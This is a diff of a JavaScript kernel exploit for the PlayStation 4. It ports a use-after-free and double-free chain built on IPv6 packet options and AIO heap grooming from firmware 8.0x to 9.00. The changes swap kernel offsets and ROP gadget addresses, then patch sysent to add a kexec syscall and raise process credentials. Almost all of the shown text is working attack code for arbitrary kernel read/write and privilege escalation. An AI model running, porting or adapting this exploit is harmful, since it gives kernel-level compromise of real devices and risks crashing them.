@@ -24,21 +24,21 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // * RESTORE - code will repair kernel panic vulnerability
 // * MEMLEAK - memory leaks that our code will induce
 
-import { Int } from '/module/int64.mjs';
-import { mem } from '/module/mem.mjs';
-import { log, die, hex, hexdump } from '/module/utils.mjs';
-import { cstr, jstr } from '/module/memtools.mjs';
-import { page_size, context_size } from '/module/offset.mjs';
-import { Chain } from '/module/chain.mjs';
+import { Int } from './module/int64.mjs';
+import { mem } from './module/mem.mjs';
+import { log, die, hex, hexdump } from './module/utils.mjs';
+import { cstr, jstr } from './module/memtools.mjs';
+import { page_size, context_size } from './module/offset.mjs';
+import { Chain } from './module/chain.mjs';
 
 import {
     View1, View2, View4,
     Word, Long, Pointer,
     Buffer,
-} from '/module/view.mjs';
+} from './module/view.mjs';
 
-import * as rop from '/module/chain.mjs';
-import * as config from '/config.mjs';
+import * as rop from './module/chain.mjs';
+import * as config from './config.mjs';
 
 const t1 = performance.now();
 
@@ -133,25 +133,26 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 10;
+const num_alias = 100;
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
+
 async function init() {
     await rop.init();
     chain = new Chain();
 
-    // TODO assumes ps4 8.0x
+    // PS4 9.00
     const pthread_offsets = new Map(Object.entries({
-        'pthread_create' : 0x25610,
-        'pthread_join' : 0x27c60,
-        'pthread_barrier_init' : 0xa0e0,
-        'pthread_barrier_wait' : 0x1ee00,
-        'pthread_barrier_destroy' : 0xe180,
-        'pthread_exit' : 0x19eb0,
+        'pthread_create' : 0x25510,
+        'pthread_join' : 0xafa0,
+        'pthread_barrier_init' : 0x273d0,
+        'pthread_barrier_wait' : 0xa320,
+        'pthread_barrier_destroy' : 0xfea0,
+        'pthread_exit' : 0x77a0,
     }));
 
     rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
@@ -952,10 +953,13 @@ function leak_kernel_addrs(sd_pair) {
 }
 
 // FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE
-
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
     for (let loop = 0; loop < num_alias; loop++) {
+        for (let i = 0; i < num_sds; i++) {
+            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+        }
+
         for (let i = 0; i < num_sds; i++) {
             tclass[0] = i;
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
@@ -980,10 +984,6 @@ function make_aliased_pktopts(sds) {
 
                 return pair;
             }
-        }
-
-        for (let i = 0; i < num_sds; i++) {
-            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
     }
     die('failed to make aliased pktopts');
@@ -1240,15 +1240,15 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         die('test read of &"evf cv" failed');
     }
 
-    // TODO FW dependent parts! assume ps4 8.0x for now
+    // PS4 9.00
 
-    const off_kstr = 0x7edcff;
+    const off_kstr = 0x7f6f27;
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
 
     log('\nmaking arbitrary kernel read/write');
     const cpuid = 7 - main_core;
-    const off_cpuid_to_pcpu = 0x228e6b0;
+    const off_cpuid_to_pcpu = 0x21ef2a0;
     const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
     log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
     const pcpu = kread64(pcpu_p);
@@ -1459,33 +1459,18 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     // RESTORE: clean corrupt pointers
     // pktopts.ip6po_rthdr = NULL
+    // ABC Patch
     const off_ip6po_rthdr = 0x68;
     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-    kmem.write64(r_rthdr_p, 0);
-    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-
     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-    log(kmem.read64(w_rthdr_p));
-    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-
+    kmem.write64(r_rthdr_p, 0);
+    kmem.write64(w_rthdr_p, 0);
     log('corrupt pointers cleaned');
-
-    /*
-    // REMOVE once restore kernel is ready for production
-    // increase the ref counts to prevent deallocation
-    kmem.write32(main_sock, kmem.read32(main_sock) + 1);
-    kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
-    // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
-    */
 
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
 // FUNCTIONS FOR STAGE: PATCH KERNEL
-
 async function get_patches(url) {
     const response = await fetch(url);
     if (!response.ok) {
@@ -1496,23 +1481,23 @@ async function get_patches(url) {
     return response.arrayBuffer();
 }
 
-// TODO 8.0x supported only
+// 9.00 supported only
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (!is_ps4) {
         throw RangeError('PS5 kernel patching unsupported');
     }
-    if (!(0x800 <= version < 0x850)) {
+    if (!(0x800 <= version < 0x900)) {
         throw RangeError('kernel patching unsupported');
     }
 
     log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
-    const offset_sysent_661 = 0x11040c0;
+    const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
-    kmem.write64(sysent_661.add(8), kbase.add(0xe629c));
+    kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
@@ -1523,7 +1508,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
-    const buf = await get_patches('/kpatch/80x.elf');
+    const buf = await get_patches('./kpatch/900.elf');
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
     const patches = new View1(await buf, 0x1000);
@@ -1616,20 +1601,6 @@ function setup(block_fd) {
         reqs1.write32(0x20 + i*0x28, block_fd);
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
-
-    {
-        const reqs1 = make_reqs1(1);
-        const timo = new Word(1);
-        const id = new Word();
-        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
-        chain.do_syscall_clear_errno(
-            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
-        const err = chain.errno;
-        if (err !== 60) { // ETIMEDOUT
-            die(`SceAIO system not blocked. errno: ${err}`);
-        }
-        free_aios(id.addr, 1);
-    }
 
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
@@ -1732,4 +1703,6 @@ export async function kexploit() {
         close(sd);
     }
 }
+
+// KEX
 kexploit();
